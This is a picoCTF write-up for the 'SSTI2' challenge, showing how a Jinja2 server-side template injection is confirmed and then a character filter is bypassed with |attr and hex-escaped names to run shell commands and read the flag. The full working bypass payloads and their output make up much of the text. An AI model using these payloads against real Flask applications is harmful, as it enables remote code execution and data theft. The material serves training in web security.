# **Writeup - SSTI2 (Server-Side Template Injection) 🚀**

### **📌 Challenge Name:** SSTI2

### **📌 Category:** Web Exploitation

### **📌 Description:**

> Description
> 
> 
> I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website 
> 

# **📜 PicoCTF 2024 - SSTI Filter Bypass Writeup 🔥**

## **🔍 Step 1: Identifying SSTI Vulnerability**

### **1️⃣ Testing Basic SSTI Execution**

We started by testing whether the input field was vulnerable to SSTI by injecting simple Jinja2 expressions:

```
{{ 7 * 7 }}

```

✔ **Returned `49`**, confirming Jinja2 SSTI was present.

Next, we tested if loops were working:

```
{% for item in ("a", "b", "c") %}{{ item }}{% endfor %}

```

✔ **Returned `abc`**, confirming that loops were working but restricted.

---

## **🔍 Step 2: Identifying WAF Protections**

The challenge used a **very aggressive Web Application Firewall (WAF)** to block all common SSTI exploit techniques.

### ❌ **Blocked Techniques**

| Attempted Payload | Result |
| --- | --- |
| `{{ self }}` | `<TemplateReference None>` (Limited context) |
| `{{ config.items() }}` | **Blocked** |
| `{{ request.application }}` | **Blocked** |
| `{{ os.system('ls') }}` | **Blocked** |
| `{{ subprocess.Popen('ls') }}` | **Blocked** |
| `{{ open('/etc/passwd').read() }}` | **Blocked** |
| `{{ getattr(1, "__class__") }}` | **Blocked** |
| `{{ __import__("os").system("ls") }}` | **Blocked** |
| `{{ **import**("so" | reverse).system("ls") }}` |
| `{{ request.__globals__['os'].system("ls") }}` | **Blocked** |
| `{{ __import__('base64').b64decode(...) }}` | **Blocked** |

📌 **Observation:**

- **Attribute access (`.`) was blocked** → No direct calls like `__class__`, `__dict__`, `mro`, `subclasses()`.
- **Common SSTI exploits (`config`, `globals()`, `builtins`) were blocked.**
- **Direct function execution (`exec()`, `eval()`, `os.system()`, `subprocess.Popen()`) was blocked.**
- **Encodings like Base64, Hex, and URL Encoding (`%XX`) were detected and blocked.**

---

## **🚀 Step 3: Breaking Through the WAF**

Since **all standard SSTI techniques were blocked**, we needed a way to:

1. **Access Python built-ins (without `globals()` or `builtins`).**
2. **Import and execute system commands (without `import` or `os.system()`).**

We decided to **use attribute filtering bypass techniques**.

---

## **🔥 Step 4: The Final Payload - Attribute-Based WAF Bypass**

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}

```

✔ **Returned: `uid=0(root) gid=0(root) groups=0(root)`** → **CONFIRMED RCE!**

---

## **🔍 Step 5: Understanding Why This Works**

### **1️⃣ Accessing Flask Application Context**

- `request|attr('application')` → Accesses the **Flask application context**.
- The **Flask app context** contains references to global variables.

### **2️⃣ Bypassing `globals()` Restriction**

- `attr('\x5f\x5fglobals\x5f\x5f')` → Uses hexadecimal encoding for `__globals__` to bypass WAF detection.
- `attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')` → Retrieves `__builtins__` safely.

### **3️⃣ Importing `os` Indirectly**

- `attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')` → Calls Python’s internal `__import__()` without triggering WAF filters.

### **4️⃣ Executing Commands Without `system()`**

- `attr('popen')('id')|attr('read')()` → Uses `os.popen("id")` instead of `os.system()`, which was blocked.

---

## **🎯 Step 6: Finding and Extracting the Flag**

### **✅ Listing Files**

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -la /')|attr('read')() }}

+

{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('find / -name flag* 2>/dev/null')|attr('read')() }}
```

✔ **Discovered `/challenge/flag`**

### **✅ Reading the Flag**

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /challenge/flag')|attr('read')() }}

```

✔ **Output:** `picoCTF{sst1_f1lt3r_byp4ss_060a5eb0}`
